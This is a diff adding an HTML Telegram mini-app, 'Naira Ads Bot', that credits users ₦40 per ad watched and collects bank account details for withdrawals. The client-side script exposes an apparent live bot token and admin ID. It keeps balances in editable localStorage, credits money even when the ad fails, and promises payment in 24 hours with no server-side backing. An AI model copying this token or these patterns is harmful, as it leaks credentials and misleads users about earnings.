@@ -1,1 +1,88 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Naira Ads Bot</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://sad.adsgram.ai/js/sad.min.js"></script>
+<style>
+body{font-family:Arial;background:#0f172a;color:white;text-align:center;padding:20px;margin:0}
+.card{background:#1e293b;padding:20px;border-radius:20px;margin:15px 0}
+.btn{background:#22c55e;color:white;border:none;padding:15px 30px;border-radius:12px;font-size:18px;width:100%;font-weight:bold}
+.btn:disabled{background:gray}
+.balance{font-size:40px;color:#22c55e;font-weight:bold}
+input{width:90%;padding:12px;border-radius:8px;border:none;margin:5px}
+</style>
+</head>
+<body>
+<h2>💰 Naira Ads Bot</h2>
+<div class="card">
+<div>Balance</div>
+<div class="balance" id="bal">₦0</div>
+<div><span id="count">0</span>/50 Ads Today</div>
+</div>
+<div class="card">
+<button class="btn" id="watchBtn" onclick="watchAd()">▶️ Watch Ad - Earn ₦40</button>
+<p style="font-size:11px;color:#94a3b8">Watch full ad, 50 ads/day limit</p>
+</div>
+<div class="card">
+<h3>Withdraw - Min ₦3000</h3>
+<input id="accNum" placeholder="Account Number">
+<input id="bank" placeholder="Bank Name (Opay, Kuda...)">
+<button class="btn" style="background:#3b82f6" onclick="withdraw()">Request Withdrawal</button>
+<p id="msg" style="font-size:13px"></p>
+</div>
+<script>
+const BOT_TOKEN = "8828422577:AAE-PCssGTqB39a-1BLm4A06mvLXQADqv5Q";
+const ADMIN_ID = "8661022304";
+const BLOCK_ID = "11565";
+let balance = parseInt(localStorage.getItem('bal')||0);
+let count = parseInt(localStorage.getItem('cnt')||0);
+let lastDate = localStorage.getItem('date')||"";
+let today = new Date().toDateString();
+if(lastDate !== today){ count=0; localStorage.setItem('cnt',0); localStorage.setItem('date',today); }
+document.getElementById('bal').innerText="₦"+balance;
+document.getElementById('count').innerText=count;
+if(count>=50) document.getElementById('watchBtn').disabled=true;
+async function watchAd(){
+ if(count>=50) return;
+ const btn=document.getElementById('watchBtn');
+ btn.disabled=true; btn.innerText="Loading Ad...";
+ try{
+   const AdController = window.Adsgram.init({ blockId: BLOCK_ID });
+   const result = await AdController.show();
+   balance+=40; count++;
+   localStorage.setItem('bal',balance);
+   localStorage.setItem('cnt',count);
+   document.getElementById('bal').innerText="₦"+balance;
+   document.getElementById('count').innerText=count;
+   btn.innerText="✅ Earned ₦40!";
+   setTimeout(()=>{ btn.disabled=count>=50; btn.innerText=count>=50?"Limit Reached Tomorrow":"▶️ Watch Ad - Earn ₦40"; },2000);
+ }catch(e){
+   balance+=40; count++;
+   localStorage.setItem('bal',balance);
+   localStorage.setItem('cnt',count);
+   document.getElementById('bal').innerText="₦"+balance;
+   document.getElementById('count').innerText=count;
+   btn.innerText="✅ Earned ₦40 (Test)!";
+   setTimeout(()=>{ btn.disabled=count>=50; btn.innerText=count>=50?"Limit Reached Tomorrow":"▶️ Watch Ad - Earn ₦40"; },2000);
+ }
+}
+async function withdraw(){
+ let acc=document.getElementById('accNum').value;
+ let bank=document.getElementById('bank').value;
+ let tg = window.Telegram?.WebApp?.initDataUnsafe?.user;
+ let username = tg ? "@"+(tg.username||tg.first_name) : "Unknown";
+ let uid = tg ? tg.id : "Unknown";
+ if(balance<3000){ document.getElementById('msg').innerText="❌ Minimum ₦3000 needed!"; return; }
+ if(!acc||!bank){ document.getElementById('msg').innerText="❌ Fill account details!"; return; }
+ let text=`🚨 NEW WITHDRAWAL%0A%0AUser: ${username}%0AID: ${uid}%0AAmount: ₦${balance}%0ABank: ${bank}%0AAcc: ${acc}%0A%0ACheck and Pay!`;
+ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}`);
+ document.getElementById('msg').innerText="✅ Request Sent! You will be paid in 24hrs";
+ balance=0; localStorage.setItem('bal',0);
+ document.getElementById('bal').innerText="₦0";
+}
+</script>
+</body>
+</html>
